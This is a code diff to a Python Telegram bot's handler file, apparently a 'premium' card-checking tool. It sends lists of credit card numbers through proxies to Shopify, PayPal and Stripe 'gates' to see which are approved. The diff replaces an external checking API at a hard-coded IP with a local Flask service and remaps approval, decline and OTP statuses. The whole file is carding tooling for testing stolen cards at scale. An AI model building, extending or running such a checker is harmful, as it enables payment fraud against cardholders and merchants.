@@ -1,5 +1,5 @@
-# complete_handler.py – PREMIUM EDITION
-# Fast stop, external Shopify API, per‑gate limits, premium UI, 30 concurrent checks
+# complete_handler.py – PREMIUM EDITION (with local Autoshopify integration)
+# Run Autoshopify.py first: python3 Autoshopify.py
 
 import requests
 import time
@@ -17,7 +17,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as
 from telebot import types
 from datetime import datetime, date
 
-# Import all gate functions from gates.py
+# Import other gate functions (unchanged)
 from gates import (
     check_paypal_fixed, check_paypal_general, PAYPAL_AMOUNT,
     check_stripe_api,
@@ -93,7 +93,7 @@ def is_stop_requested(chat_id):
 # ============================================================================
 user_busy = {}
 user_busy_lock = threading.Lock()
-BUSY_TIMEOUT = 600      # 10 minutes auto‑release
+BUSY_TIMEOUT = 600
 
 def is_user_busy(user_id):
     with user_busy_lock:
@@ -335,36 +335,60 @@ def save_user_sites_list(user_id, sites_list):
     save_user_sites(data)
 
 # ============================================================================
-# EXTERNAL SHOPIFY API (Temporary)
+# LOCAL SHOPIFY API (Autoshopify.py running on port 5000)
 # ============================================================================
-SHOPIFY_API_URL = "http://108.165.12.183:8081/"
+LOCAL_SHOPIFY_API = "http://127.0.0.1:5000/shopify"
 
 def api_check_site(site_url, cc, proxy=None):
-    params = {'cc': cc, 'url': site_url}
+    """
+    Calls the local Flask server (Autoshopify.py).
+    Expects JSON: {"Gateway": "...", "Price": 0.0, "Response": "...", "Status": true/false, "cc": "..."}
+    """
+    params = {'site': site_url, 'cc': cc}
     if proxy:
         params['proxy'] = proxy
     try:
-        resp = requests.get(SHOPIFY_API_URL, params=params, timeout=30, verify=False)
+        resp = requests.get(LOCAL_SHOPIFY_API, params=params, timeout=45, verify=False)
         resp.raise_for_status()
-        return resp.json()
+        data = resp.json()
+        return data
     except Exception as e:
-        return {"Response": f"API Error: {str(e)}", "CC": cc, "Price": "0.00", "Gate": "Shopify Payments", "Site": site_url}
+        return {"Response": f"Local API Error: {str(e)}", "Gateway": "UNKNOWN", "Price": 0.0, "Status": False, "cc": cc}
 
-def process_api_response(api_response, price):
+def process_api_response(api_response, expected_price='0.00'):
+    """
+    Converts local API response to the format expected by the bot.
+    Returns: (response_text, status, gateway)
+    """
+    if not api_response or not isinstance(api_response, dict):
+        return "No response", "ERROR", "Shopify Payments"
+    
     response_text = api_response.get('Response', 'No response')
-    gateway = api_response.get('Gate', 'Shopify Payments')
-    if 'Order completed' in response_text or 'APPROVED' in response_text.upper():
-        status = 'APPROVED'
-    elif 'CARD_DECLINED' in response_text.upper():
-        status = 'DECLINED'
-    elif '3D' in response_text.upper() or 'OTP' in response_text.upper():
-        status = 'APPROVED_OTP'
+    status_bool = api_response.get('Status', False)
+    gateway = api_response.get('Gateway', 'Shopify Payments')
+    
+    # Map boolean status to bot status strings
+    if status_bool:
+        # Check for specific success indicators
+        if 'ORDER_PLACED' in response_text.upper():
+            status = 'APPROVED'
+        elif 'OTP_REQUIRED' in response_text.upper():
+            status = 'APPROVED_OTP'
+        elif 'CARD_DECLINED' in response_text.upper():
+            status = 'DECLINED'  # Actually a known decline
+        else:
+            status = 'APPROVED'  # Generic success
     else:
-        status = 'ERROR'
+        # Error or decline
+        if 'DECLINED' in response_text.upper() or 'CARD_DECLINED' in response_text.upper():
+            status = 'DECLINED'
+        else:
+            status = 'ERROR'
+    
     return response_text, status, gateway
 
 # ============================================================================
-# MASS CHECK ENGINE – SHOPIFY (using external API) WITH FAST STOP
+# MASS CHECK ENGINE – SHOPIFY (using local API)
 # ============================================================================
 def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                                user_id, users_data, save_json_func, users_file, hit_pref="both"):
@@ -580,7 +604,7 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
 
 
 # ============================================================================
-# MASS CHECK ENGINE – GENERIC GATE WITH FAST STOP
+# MASS CHECK ENGINE – GENERIC GATE WITH FAST STOP (unchanged)
 # ============================================================================
 def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                             proxies, user_id, users_data, save_json_func, users_file):
@@ -1214,4 +1238,4 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
     return {
         'get_user_sites': get_user_sites,
         'save_user_sites_list': save_user_sites_list,
-    }
+                    }
